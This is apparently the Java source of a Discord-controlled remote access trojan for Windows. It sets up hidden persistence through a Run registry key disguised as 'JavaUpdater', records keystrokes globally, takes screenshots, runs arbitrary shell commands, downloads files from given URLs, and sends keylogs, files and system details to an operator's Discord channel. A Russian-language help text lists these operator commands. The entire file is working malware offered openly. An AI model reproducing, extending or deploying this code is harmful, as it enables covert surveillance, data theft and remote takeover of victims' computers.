package k3rry1xrd;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.events.Event;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.annotation.Nonnull;
import javax.imageio.ImageIO;
import javax.security.auth.login.LoginException;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Start extends ListenerAdapter implements NativeKeyListener
{
    private String id;
    private static boolean keyloggerVal = false;
    private static final String USERNAME = System.getProperty("user.name");
    private static final String PATH_ID = "C:\\Users\\" + USERNAME + "\\AppData\\Roaming\\";
    private static final String PATH_KEYLOGGER = PATH_ID + "\\key.txt";
    private static final String CMD_COMMAND = "cmd /c ";
    private static final String symbol = "!";
    private static final String fileName = "ChromeOptions.txt";
    private static final String help =
                      "!id help - Просмотреть список команд\n"
                    + "!id start <file> - Запустить файл/сайт\n"
                    + "!id screenshot - Получить скриншот\n"
                    + "!id console - Отправить консольную комманду\n"
                    + "!id upload - Скачать файл по ссылке\n"
                    + "!id keylogger <start/stop> - Включить keylogger\n"
                    + "!id download <path> - Скачать файл\n"
                    + "!all <command> - Выполнить комманду для всех пользователей\n"
                    + "!all online - Просмотреть кто в сети\n";

    public static void main(String[] args) throws LoginException {
        try {
            byte[] decodedBytes = Base64.getDecoder().decode("Discord token base64");
            new JDABuilder(new String(decodedBytes)).addEventListeners(new Liba()).setActivity(Activity.watching("хихихи")).build();
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                e.printStackTrace();
            }

            LogManager.getLogManager().reset();

            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);

            GlobalScreen.addNativeKeyListener(new Liba());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private String getUsername() {
        return USERNAME;
    }

    private String getIDPath() {
        return PATH_ID;
    }

    private String getPathKeylogger() {
        return PATH_KEYLOGGER;
    }

    private void sendMessageFile(Event event, String path) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(new File(path)).queue();
    }

    private void embedSendMessage(Event event, String content) {
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Waves | " + getID() + " help");
        eb.setDescription(content);
        eb.setColor(Color.GRAY);

        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(eb.build()).queue();
    }

    private void sendMessage(Event event, String content) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(content).queue();
    }

    private void startUp() {
        try {
            Runtime.getRuntime().exec(CMD_COMMAND + "\"reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" ^ /v \"JavaUpdater\" ^ /d \"" + Paths.get(System.getProperty("java.home"), "bin", "javaw.exe") + " -cp " + new File(String.valueOf(Liba.class.getProtectionDomain().getCodeSource().getLocation())).getPath().split("file:\\\\")[1] + " com.sun.jna.Liba \"");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void createID() {
        try {
            File file = new File(getIDPath(), fileName);
            if(!file.exists()) {
                PrintWriter writer = new PrintWriter(getIDPath() + fileName, "UTF-8");
                writer.println(getUsername().substring(0, 3) + (int) (Math.random() * 9999));
                writer.close();
            }
        } catch (IOException io) {
            io.printStackTrace();
        }
    }

    private String getID() {
        try {
            id = new String(Files.readAllBytes(Paths.get(getIDPath() + fileName))).trim();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return symbol + id;
    }

    private String getData() {
        String time = new SimpleDateFormat("yyyy/MM/dd HH:mm").format(Calendar.getInstance().getTime());

        return  "User: " + getUsername() +
                "\nID: " + getID() +
                "\nTime: " + time +
                "\nCPUs: " + Runtime.getRuntime().availableProcessors() +
                "\nOS: " + System.getProperty("os.name") + " " + System.getProperty("os.arch");
    }

    private void uploadFile(String command, String path) {
        try {
            Files.copy(new URL(command).openStream(), Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void screenShot(Event event) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            ImageIO.write(new Robot().createScreenCapture( new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "jpg", stream);
            event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(stream.toByteArray(), "screenshot.jpg").queue();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private void consoleCommand(String content) {
        try {
            Runtime.getRuntime().exec(CMD_COMMAND + content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void startSite(String content) {
        try {
            Runtime.getRuntime().exec(CMD_COMMAND + "start " + content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if(keyloggerVal) {
            String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

            try (OutputStream os = Files.newOutputStream(Paths.get(getPathKeylogger()), StandardOpenOption.CREATE, StandardOpenOption.WRITE,StandardOpenOption.APPEND);
                 PrintWriter writer = new PrintWriter(os)) {

                if (keyText.length() > 1) {
                    writer.print("[" + keyText + "]");
                } else {
                    writer.print(keyText);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onReady(@Nonnull ReadyEvent event) {
        startUp();
        createID();
        embedSendMessage(event, getData());
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
            String command = event.getMessage().getContentRaw();
            String[] commandSplit = command.split(" ");

            if (commandSplit[0].startsWith(getID()) || commandSplit[0].startsWith(symbol + "all")) {
                if (commandSplit[1].startsWith("start"))
                    startSite(commandSplit[2]);
                else if (commandSplit[1].startsWith("console"))
                    consoleCommand(command.split("console ")[1]);
                else if (commandSplit[1].startsWith("help"))
                    sendMessage(event, help);
                else if (commandSplit[1].startsWith("online"))
                    embedSendMessage(event, getData());
                else if (commandSplit[1].startsWith("screenshot"))
                    screenShot(event);
                else if (commandSplit[1].startsWith("upload"))
                    uploadFile(commandSplit[2], commandSplit[3]);
                else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("start"))
                    keyloggerVal = true;
                else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("stop")) {
                    keyloggerVal = false;
                    sendMessageFile(event, PATH_KEYLOGGER);
                }
                else if (commandSplit[1].startsWith("download"))
                    sendMessageFile(event, commandSplit[2]);
            }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {}

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {}

}
